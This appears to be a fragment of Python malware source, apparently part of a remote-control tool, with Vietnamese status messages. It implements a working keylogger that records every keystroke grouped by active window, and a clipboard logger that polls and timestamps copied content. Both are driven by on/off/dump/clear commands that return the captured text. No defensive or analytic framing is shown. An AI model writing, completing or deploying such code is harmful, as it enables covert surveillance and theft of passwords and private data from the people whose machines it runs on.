          def _klog_start():
              global _klog_on, _klog_listener
              if not pynput or _klog_on: return
              def on_press(key):
                  win = active_window()
                  if win != _klog_win[0]:
                      _klog_win[0] = win; _klog_buf.append(f"\n\n=== [{win}] ===\n")
                  try: _klog_buf.append(key.char or "")
                  except Exception: _klog_buf.append(f"[{key.name}]")
              _klog_listener = pynput.keyboard.Listener(on_press=on_press)
              _klog_listener.start(); _klog_on = True

          def f_keylog(mode):
              global _klog_on, _klog_buf
              m = mode.lower()
              if m == "on": _klog_start(); return "Keylog ON"
              if m == "off":
                  if _klog_listener: _klog_listener.stop()
                  _klog_on = False; return "Keylog OFF"
              if m == "dump":
                  txt = "".join(_klog_buf); _klog_buf = []; return txt or "[chưa có phím]"
              if m == "clear": _klog_buf = []; return "Đã xóa log"
              return "Dùng: on|off|dump|clear"

          def _clip_start():
              global _clip_on
              if _clip_on or not pyperclip: return
              _clip_on = True
              def loop():
                  last = ""
                  while _clip_on:
                      try:
                          cur = pyperclip.paste()
                          if cur and cur != last:
                              last = cur
                              _clip_buf.append(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {cur}")
                      except Exception: pass
                      time.sleep(0.5)
              threading.Thread(target=loop, daemon=True).start()

          def f_cliplog(mode):
              global _clip_on, _clip_buf
              m = mode.lower()
              if m == "on": _clip_start(); return "Clipboard log ON"
              if m == "off": _clip_on = False; return "Clipboard log OFF"
              if m == "dump":
                  txt = "\n".join(_clip_buf); _clip_buf = []; return txt or "[chưa có gì]"
              if m == "clear": _clip_buf = []; return "Đã xóa"
              return "Dùng: on|off|dump|clear"

